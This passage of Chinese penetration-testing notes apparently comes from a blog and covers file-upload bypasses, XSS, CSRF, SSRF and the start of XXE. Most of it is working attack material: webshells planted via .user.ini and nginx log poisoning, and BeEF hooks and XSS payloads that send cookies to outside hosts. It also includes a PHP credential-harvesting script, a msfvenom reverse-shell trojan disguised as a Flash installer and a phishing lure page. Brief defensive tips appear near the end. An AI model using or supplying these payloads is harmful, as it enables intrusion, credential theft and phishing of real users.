GIF89A</li>\n<li>.htaccess 绕过：apache 中间件可上传内容为 AddType application/x-httpd-php .png</li>\n<li>的.htaccess 文件，使 png 后缀文件当成 php 解析，nginx 中间件需要相关配置才会支持</li>\n<li>二次渲染绕过：在未被删掉代码的图片源代码中添加后门上传，如果对方服务器返回了</li>\n<li>文件的地址如 http://127.0.0.1/images/?image=1.png 的文件包含形式，则可能执行后门</li>\n<li>二次渲染：图片上传之后被做了修改，遗留下了被裁剪后的图片，图片源代码有所减少</li>\n<li>二次渲染配合条件竞争：文件到了服务器才进行的过滤是存在二次渲染问题的，配合条件竞争可以实现后门写入，文件存在的那一刹那，对文件进行重复访问，此时文件不会被重命名，php 文件留下来了；二次渲染一般用脚本生成图片，手工生成不容易判断哪里的代码会被消除</li>\n<li>图片中的后门代码被执行需要配合解析漏洞、文件包含、.user.ini 或.htaccess 四者之一</li>\n</ul>\n<h4 id=\"userini-巧用\"><a class=\"markdownIt-Anchor\" href=\"#userini-巧用\">#</a> .user.ini 巧用</h4>\n<ul>\n<li>\n<p>.user.ini 绕过：上传内容为 auto_prepend_file=test.png 的.user.ini 文件；并上传内容为 <?php eval($_POST[x]);?>的 test.png，访问 index.php 时则执行 test.png 中的后门</p>\n</li>\n<li>\n<p>点过滤绕过：上传内容为 &lt;?=include’<span class=\"exturl\" data-url=\"aHR0cDovLzc5NDc1MDA2OS8=\">http://794750069/</span>’&gt; 的 xxx 文件，此地址的首页源 代码上写上后门代码，并上传 auto_prepend_file=xxx 的.user.ini 文件，则可触发后门</p>\n</li>\n<li>\n<p>文件上传即删除绕过：上传内容为 auto_prepend_file=http://794750069 / 的.user.ini 文 件，此时访问 index.php 就会被当作访问了存放在远程的后门文件</p>\n</li>\n<li>\n<p>无 index.php 文件：没有首页文件并且过滤非常严谨，可以先上传任意内容的 index.php 文件，再上传内容为 auto_prepend_file=/var/log/nginx/access.log 的.user.ini 文 件，抓包并在 UA 中写入一句话后门则可以得到 webshell</p>\n</li>\n</ul>\n<p><strong>*.user.ini 实际上就是一个可以由用户 “自定义” 的 php.ini，我们触发访问的的代码并不是.user.ini 也不是 1.png 而是 index.php，它有去让这个.user.ini 生效。我们访问 index.php, 会按照我们上传的.user.ini 去解析，解析了我们上传的包含恶意代码的 test.png 文件。</strong></p>\n<h4 id=\"日志文件写木马\"><a class=\"markdownIt-Anchor\" href=\"#日志文件写木马\">#</a> 日志文件写木马</h4>\n<p><strong>nginx 的日志文件时 /var/log/nginx/access.log，可以通过修改.user.ini 的配置使 index.php 包含其 nginx 日志文件，此时访问 index.php 文件时将会定位到日志文件。日志文件中记录有 UA 头，伪造 UA 数据为一句话木马，此木马被记录到 日志，在 index.php 处执行木马文件即可获得 webshell。</strong></p>\n<ul>\n<li>\n<p>上传.user.ini: auto_prepend_file=test.png</p>\n</li>\n<li>\n<p>上传 test.png: <?=include\"/var/lo\".\"g/nginx/access.lo\".\"g\"?> 访问 index.php 文件则会出现 nginx 的日志文件</p>\n</li>\n<li>\n<p>抓包伪造 UA: <?=eval($_POST[x]);?></p>\n</li>\n<li>\n<p>执行木马: x=system (‘tac …/flag.php’);</p>\n</li>\n</ul>\n<h4 id=\"中间件-解析漏洞\"><a class=\"markdownIt-Anchor\" href=\"#中间件-解析漏洞\">#</a> 中间件 解析漏洞</h4>\n<ul>\n<li>\n<p>IIS 6 7 : 文件名 x.asp;.x.jpg、目录名 x.asp/x.jpg</p>\n</li>\n<li>\n<p>Apache 换行解析 配置不当: CVE-2017-15715，2.4.0~2.4.29 版本存在解 析漏洞；上传 evil.php 文件，在文件末尾添加空格，找到 hex 中的 20 修改为 0a，上传之后访问文件 /evil.php%0a 即可触发后门代码内容</p>\n</li>\n<li>\n<p>Apache htaccess 配置不当：AddHandler application/x-httpd-php .php，将 1.php.png 解析为 php</p>\n</li>\n<li>\n<p>nginx 文件名逻辑：CVE-2013-4547 ,0.8.4 ~1.4.3 / 1.5.0~1.5.7 存在文件名逻辑 漏洞；上传内容为 <?php phpinfo();?> 的 “1.gif [0x20]” 文件，访问 /1.gif [0x20][0x00].php，即可发现 PHP 被解析<br>\n <code>[0x20]表示 hex 处的值是 20，对应可视化界面是一个空格</code></p>\n</li>\n<li>\n<p>nginx nginx.conf 配置不当：该漏洞与 Nginx、php 版本无关，属于用户配置 不当造成的解析漏洞，上传 /nginx.png，访问 /nginx.png/.php 即可解析 png 为 php<br>\n <code>实战可以直接找到属于该中间件下的一个图片的原链接地址，后缀加/.php 测试是否执行</code></p>\n</li>\n<li>\n<p>编辑器漏洞：如果能扫描到编译器目录，可以寻找是否存在相关历史漏洞</p>\n</li>\n</ul>\n<h4 id=\"漏洞寻找-审计技巧\"><a class=\"markdownIt-Anchor\" href=\"#漏洞寻找-审计技巧\">#</a> 漏洞寻找 审计技巧</h4>\n<ul>\n<li>黑盒：</li>\n</ul>\n<p>黑盒寻找一切存在文件上传的功能应用 (看流程): 个人用户中心是否存在文件上传功能、后台管理系统是否存在文件上传功能、字典目录扫描探针文件上传构造地址、字典目录扫描探针编辑器目录构造地址。</p>\n<p>黑盒测试功能:<br>\n 上传文件进行数据包拦截，尝试修改后缀、MIME 类型、后缀大小写、加点空格、 文件头部、.user.ini、.htaccess 等，如都失败了，可以抓取其他功能如重命名数据包看是 否能修改后缀、可以改 404 模板看是否允许修改、还可以先下载模板并写入木马后用后 台删除原有模板并重新加载带有木马的模板等。</p>\n<p>如果已经上传了 php 文件但是并没有被执行而是返回了 403，很有可能是目录做了 限制如.htaccess 的过滤，可以上传或重命名或移动到其他目录下尝试是否能被执行，还 可以直接删除.htaccess 文件消除此目录下的限制。</p>\n<ul>\n<li>白盒：</li>\n</ul>\n<p>白盒看三点，中间件，编辑器，功能代码 (看代码): 中间件直接看语言环境常见搭 配编辑器、直接看目录机构或搜索关键字、功能代码直接看源码应用或搜索关键字。</p>\n<p>白盒调试代码:<br>\n 一般调试代码是通过代码编辑器里边的调试按键或者直接打印某些不容易推断的变 量，也可以通过网站的审查元素功能确定当前的 url 及传参地址，还能通过 burp 抓取数 据包，直接就可以确定当前操作的 url 地址并且在代码中进行定位。</p>\n<p>根据 url 地址或者上传恶意文件时文件的报错锁定代码位置，追朔代码过滤规则及漏 洞产生的原因，在哪个地方过滤的，是黑白名单过滤还是过滤不严谨等。</p>\n<h3 id=\"xss-跨站\"><a class=\"markdownIt-Anchor\" href=\"#xss-跨站\">#</a> xss 跨站</h3>\n<h4 id=\"xss-原理分类及寻找\"><a class=\"markdownIt-Anchor\" href=\"#xss-原理分类及寻找\">#</a> xss 原理分类及寻找</h4>\n<ul>\n<li>xss 跨站原理</li>\n</ul>\n<p>指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其 他用户造成影响的 HTML 代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执 行用户注入的脚本。</p>\n<ul>\n<li>xss 跨站分类</li>\n</ul>\n<p>反射型（非持久型）: 指执行一次的漏洞，不会存储到数据库中<br>\n存储型（持久型）: 攻击代码写入到了数据库里，其他人访问时被攻击<br>\n DOM 型：数据的输入输出都是在浏览器 js 代码里边完成的，没有进入后端</p>\n<ul>\n<li>xss 漏洞的寻找</li>\n</ul>\n<p>数据交互的地方:get/post/headers，反馈与浏览，富文本编辑器，各类标签插入和自定义<br>\n数据输出的地方：用户资料，关键词、标签、说明，文件上传</p>\n<h4 id=\"beef-xss-安装及使用\"><a class=\"markdownIt-Anchor\" href=\"#beef-xss-安装及使用\">#</a> beef-xss 安装及使用</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用docker在服务器安装，默认用户名密码都是beef</span></span><br><span class=\"line\">docker pull janes/beef</span><br><span class=\"line\">3docker run - p 3000:3000 - d janes/beef</span><br><span class=\"line\">http://110.42.178.227:3000/ui/panel</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">本地写内容如下的 1 .html文件，当此页面被打开时，即beef上线</span></span><br><span class=\"line\">&lt;script src=&quot;http://110.42.178.227:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">beef观察到用户上线，可以在beef上盗取cookies，浏览器跳转，钓鱼等操作</span></span><br></pre></td></tr></table></figure>\n<p><strong>将 hook 的指向代码放到自己的网站首页的内容里，同时引诱对方去访问自己的网站，当对方访问自己网站首页时，此时就会劫持到对方当前页面，可窃取 cookie; 但是毕竟是前 端代码造成的危害，js 代码可执行的操作很有限，需要诱使对方去下载木马拿主机权限</strong></p>\n<h4 id=\"uxss-flashxss-pdfxss\"><a class=\"markdownIt-Anchor\" href=\"#uxss-flashxss-pdfxss\">#</a> uxss flashxss pdfxss</h4>\n<ul>\n<li>\n<p>UXSS (通用型 xss): 利用浏览器或者浏览器扩展漏洞来制造产生 XSS 并执 行代码的一种攻击类型，CVE-2021-34506 Edge 低版本浏览器翻译功能导致 JS 语句被调用执行。</p>\n</li>\n<li>\n<p>Flashxss:swf 引用 js 的 xss，swf 下载后利用 JPEXS Free Flash Decompiler 反编译审计，寻找 ExternalInterface.call 执行 JS 代码的地方。</p>\n</li>\n<li>\n<p>PDFXSS: 上传后直链触发，创建 PDF 加入动作 JS、通过文件上传获取直链、直链地址通过浏览器访问后被触发，常用于钓鱼诱使对方下载 pdf 文件并 用 js 代码窃取相关凭据。</p>\n</li>\n</ul>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># pdfxss的制作及应用场景</span><br><span class=\"line\">下载迅捷pdf编辑器-文件-新建文档-从空白页</span><br><span class=\"line\">视图-页面缩略图-右键缩略图属性-添加动作-新增运行js代码-app.alert(1)</span><br><span class=\"line\">然后保存为1.pdf，后将pdf文件用浏览器打开即可触发js代码</span><br><span class=\"line\">pdfxss上线beef的代码&lt;script src=&quot;http://110.42.178.227:3000/hook.js&quot;&gt;&lt;/script&gt;不对，可能是需要其他的代码或者其他的手段才能窃取cookie</span><br></pre></td></tr></table></figure>\n<h4 id=\"表单劫持实现维权\"><a class=\"markdownIt-Anchor\" href=\"#表单劫持实现维权\">#</a> 表单劫持实现维权</h4>\n<p>前提是已经拿到了后台权限或者当前可以修改一些敏感文件；如 /login.php 登录后跳转到了 /admin/index.php 页面，可以修改后者，增加代码为上线 beef 或者 xss 平台窃取 cookie 的内容，则对方管理员在登录后就会将 cookie 发送到我们所设置的平台上。而若对方网站有同源策略或者防护的情况下，我们得到的 cookie 是不完整的，如丢失了 PHPSESSION，剩下的 cookie 部分不支持我们登入其后台。</p>\n<p>此时可以通过表单劫持来实现权限维持，通过抓包分析出网站在输入密码后会访问的网址如 /admin/login_check.php 页面，找到记录账户和密码的变量，将其发送到自己的远程服务器，$i=<script src=\"http://x.x.x.x/get.php?user=account&pass=passwd\"></script>;echo $i，在自己的服务器上构造 get.php 文件用来接收 js 传过来的参数。于是乎，当对方每次登录后台的时候都会把最新的密码发送到自己的服务器上。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">服务器上的get.php的内容如下：</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">u=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>];</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">p=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;pass&#x27;</span>];</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">myfile = fopen(<span class=\"string\">&quot;newfile.txt&quot;</span>, <span class=\"string\">&quot;a+&quot;</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">fwrite($</span><span class=\"language-bash\">myfile, <span class=\"variable\">$u</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">fwrite($</span><span class=\"language-bash\">myfile, <span class=\"string\">&#x27;|&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">fwrite($</span><span class=\"language-bash\">myfile, <span class=\"variable\">$p</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">fclose($</span><span class=\"language-bash\">myfile);</span></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>浏览器网马配合 MSF 访问上线 (windows XP/windows 7):</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">先配置msfconsole生成URL</span></span><br><span class=\"line\">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class=\"line\">set allowpowershellprompt true</span><br><span class=\"line\">set target 1</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">会生成一个url地址，诱使受害者访问此URL，一旦访问之后，msf就会上线拿到对方主机权限。</span></span><br></pre></td></tr></table></figure>\n<p>也可以先将 beef 代码放在自己的服务器上诱使对方访问恶意 url 地址，再通过 beef 的功能执行由 msf 生成的 url 进行上线。由于只适用于 XP/7 系统，在现在的网络环境上已经几乎碰不到了，但是钓鱼的思路还是很不错的。</p>\n<h4 id=\"flash钓鱼及msf捆绑\"><a class=\"markdownIt-Anchor\" href=\"#flash钓鱼及msf捆绑\">#</a> Flash 钓鱼及 MSF 捆绑</h4>\n<p>参考地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdGhlc3BhY2UvcC8xNTUyMDk0NS5odG1s\">https://www.cnblogs.com/thespace/p/15520945.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">msf 生成后门:</span></span><br><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.16 8.0.102 LPORT=4444 -f exe -o ~/Desktop/flash.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载官方文件旧版 www.flash.cn 的钓鱼页,并下载 flash 的最新安装程序。</span></span><br><span class=\"line\">https://github.com/r00tSe7en/Fake-flash.cn</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载 winrar 解压缩工具，将 flash.exe 与 flash_install.exe 文件捆绑，选中之后-用 winrar 压缩-勾选自解压格式压缩文件-高级中的自解压选项-解压路径为 C:\\windows\\temp, 选择设置中解压前运行 flash.exe，解压后运行 flash_install.exe-重命名后保存。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">图标伪造，利用 Restorator 工具，将 flash 原有的图标导出为 ico，并且将用 rar 新生 成的 exe 的图标改为 flash 图标并保存后获得正确的图标。将此文件放入到外网地址中， 并用钓鱼页面的下载地址指向 flash_install.exe 的下载链接。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MSF配置监听状态</span></span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport 4444</span><br><span class=\"line\">run</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">再次使用适当的语言诱使受害者点击，需要准备精心设计的 html 页面，并在点击图 片或者视频的时候会跳转到远程的 flash 下载界面，当用户点击下载 flash 并且执行后， 木马就会成功上线，msf 就会接收到对方主机的会话。钓鱼代码如下所示</span></span><br><span class=\"line\">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class=\"line\">  &lt;head&gt;</span><br><span class=\"line\">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class=\"line\">    &lt;title&gt;小迪与某主播SESE画面流出！&lt;/title&gt;</span><br><span class=\"line\">  &lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  小迪与某主播SESE画面流出！&lt;br&gt;</span><br><span class=\"line\">  &lt;img src=&quot;1.jpg&quot; alt=&quot;&quot; width=&quot;300&quot; height=600 align=&quot;absmiddle&quot;/ onclick=a()&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">function a()&#123;</span><br><span class=\"line\">  alert( &quot;您的FLASH版本过低，尝试升级后访问该页面! &quot;);</span><br><span class=\"line\">  window.location.href=&quot;http://192.168.0.111/&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>++ 实测中木马未做免杀被 Defender 拦截，且 rar 压缩出现了问题，并没有释放 exe 木马</p>\n<h4 id=\"xss-常见绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss-常见绕过\">#</a> XSS 常见绕过</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">window.location.href=<span class=\"string\">&#x27;https://www.baidu.com&#x27;</span> 指将当前页面跳转到百度</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">document.cookie指获取当前页面的cookie的值</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">可在审查元素中的console即控制台中输入js代码测试其功能</span></span><br><span class=\"line\">&lt;script&gt;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">script被过滤之后可用其他的标签来进行替换</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">onload事件是浏览器解析完页面之后就会自动触发的事件</span></span><br><span class=\"line\">&lt;img src=1 onerror=window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class=\"line\">&lt;body onload=1 onerror=window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class=\"line\">&lt;input onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class=\"line\">&lt;svg onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">空格被过滤的情况下，可以用<span class=\"string\">&#x27;/&#x27;</span>进行替换</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">后台管理员有功能页面，能够查看注册用户的账号密码 将注册的帐号密码改成JS代码（获取cookie）， 在管理员查看账号密码的时候触发 JS</span></span><br><span class=\"line\">&lt;svg/onload=&quot;window.location.href=&#x27;http://x.xxx.xx.x/get.php?c=&#x27;+document.cookie;&quot;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">后台管理员的cookie的值如果有实效，得到之后很快就不可再次使用，那么可以直接读取后台界面的内容，这里根据html标签匹配到了固定位置的代码，也可以用js代码来获取页面全部的源代码</span></span><br><span class=\"line\">&lt;script&gt; $(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class=\"line\">if(value.innerHTML.indexOf(&#x27;ctf&#x27;+&#x27;show&#x27;)&gt;-1)&#123; window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+value.innerHTML;</span><br><span class=\"line\">&#125; &#125;);</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改密码的时候抓到了一个url地址，通过此url地址改变了当前用户的密码，可以让管理员以其身份去执行恶意构造的url被动的修改其密码，这也是csrf漏洞；通过js代码新建了一个带有修改管员密码的用户，管员在查看此用户信息的时候就会执行js代码从而密码被改</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">location会重定向动静太大，而src是没有感知的；js需要通过ajax来post数据</span></span><br><span class=\"line\">&lt;script&gt;src=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br><span class=\"line\">&lt;script&gt;$.ajax(&#123;url:&#x27;http://127.0.0.1/api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"xss-修复及防止\"><a class=\"markdownIt-Anchor\" href=\"#xss-修复及防止\">#</a> XSS 修复及防止</h4>\n<ul>\n<li>\n<p>过滤一些危险字符，以及转义 &amp; &lt; &gt; &quot; ’ 等危险字符</p>\n</li>\n<li>\n<p>HTTP-only Cookie：用来保护 cookie，防止 cookie 被窃取</p>\n</li>\n</ul>\n<p>php.ini 设置：session.cookie_httponly =1</p>\n<p>或代码引用：ini_set (“session.cookie_httponly”, 1);</p>\n<ul>\n<li>设置 CSP (Content Security Policy)：用来防止内容被外部调用，同时也能防止 xss</li>\n</ul>\n<p>代码引用：header (&quot;Content-Security-Policy:img-src ‘self’&quot;);</p>\n<ul>\n<li>输入内容长度限制，实体转义等</li>\n</ul>\n<h3 id=\"csrf-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf-ssrf\">#</a> CSRF、SSRF</h3>\n<h4 id=\"csrf-原理-利用-防御\"><a class=\"markdownIt-Anchor\" href=\"#csrf-原理-利用-防御\">#</a> CSRF 原理 利用 防御</h4>\n<p>（1）CSRF 原理及定义</p>\n<p>a 某登陆自己的后台，b 某引诱 a 某点击自己伪造的网址；b 某在自己的页 面上写上 a 某添加自己后台管理员的数据包；a 某触发该恶意数据包，管理员被添加；即重复发送数据包让受害者利用他的权限请求我们定义的数据包。添加管理员的数据包可以本地搭建相同的 cms 或者框架，并且利用 csrftest 工具截取到执行操作的数据包并构造 url。</p>\n<p><strong>csrftest 工具比较古老了已经，也可以自己抓取捕获敏感流程数据包测试</strong></p>\n<p>（2）CSRF 的攻击过程两个条件：</p>\n<p>目标用户已经登录了网站，能够执行网站的功能</p>\n<p>目标用户访问了攻击者构造的 URL</p>\n<p><strong>如我正在网站后台执行一些操作，突然一个人发来一个很有诱惑性的地址，我点进去一看什么也不执行，但是此页面却在无形之中给我的网站增加了一个用户或者修改了管理员 密码，可以通过查看 log 中的 POST 数据及增 / 改管理员数据包的线索朔源。</strong></p>\n<p>（3）CSRF 防御策略：</p>\n<p>同源策略，检测来源是否是同一域名，但可以通过抓取数据包修改 Refer 来 源；一是在代码中伪造数据包固定 Refer 来源 (可以写一个 py 脚本自定义数据 包进行伪造)、二是尝试寻找可上传地方，上传 html 的恶意 url 地址。</p>\n<p>加入 token，每次操作都会有一个随机 token，这个 token 是唯一的无法绕过</p>\n<p>加入验证码，但是可以用 burp 的验证码插件完成</p>\n<h4 id=\"ssrf-原理-危害-修复\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-原理-危害-修复\">#</a> SSRF 原理 危害 修复</h4>\n<p>（1）SSRF 原理及定义</p>\n<p>相当于我们以存在 SSRF 这个服务器为跳板进行的一些加载操作，程序写 法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件。可以在此功能点探测内网服务，识别内网资产，远程下载 木马并直接运行。</p>\n<p>（2）SSRF 的危害：</p>\n<p>加载外部的恶意木马文件执行</p>\n<p>加载内部的敏感文件程序自身的敏感文件</p>\n<p>来访问内网进行内网端口的扫描、获取内网设备信息、枚举内网服务等</p>\n<p>配合 burp 爆破可识别到内网中的信息</p>\n<p>（3）SSRF 支持协议：</p>\n<p>dict, file, ftp, ftps, gopher, http, https, imap, imaps, ldap, pop3, pop3s, rtsp, scp, sftp, smtp, smtps, telnet, tftp</p>\n<p>（3）SSRF 常见安全修复防御方案：</p>\n<p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。</p>\n<p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>\n<p>限制请求的端口为 http 常用的端口，比如 80,443,8080,8090。</p>\n<p>黑名单内网 ip，避免应用被用来获取获取内网数据，攻击内网。</p>\n<p>禁用不需要的协议，仅仅允许 http/https，防止类似于 file:///,gopher://,<span class=\"exturl\" data-url=\"ZnRwOi8vJUU3JUFEJTg5\">ftp:// 等</span>。</p>\n<h4 id=\"ssrf黑盒测试\"><a class=\"markdownIt-Anchor\" href=\"#ssrf黑盒测试\">#</a> SSRF 黑盒测试</h4>\n<p>社交分享功能：获取超链接的标题等内容进行显示</p>\n<p>转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览</p>\n<p>在线翻译：给网址翻译对应网页的内容</p>\n<p>图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片</p>\n<p>图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验</p>\n<p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试</p>\n<p>网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作</p>\n<p>数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数</p>\n<p>邮件系统：比如接收邮件服务器地址</p>\n<p>编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等</p>\n<p>未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞</p>\n<p>一些的 url 中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p>\n<p>从远程服务器请求资源（upload from url 如 discuz！；import &amp; expost rss feed 如 webblog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）</p>\n<h3 id=\"xml-xxe\"><a class=\"markdownIt-Anchor\" href=\"#xml-xxe\">#</a> XML、XXE</h3>\n<h4 id=\"xxe-原理-利用\"><a class=\"markdownIt-Anchor\" href=\"#xxe-原理-利用\">#</a> XXE 原理 利用</h4>\n<p>（1）XML/XXE 原理与定义：</p>\n<p>XML 被设计为传输和存储数据，XML 文档结构包括 XML 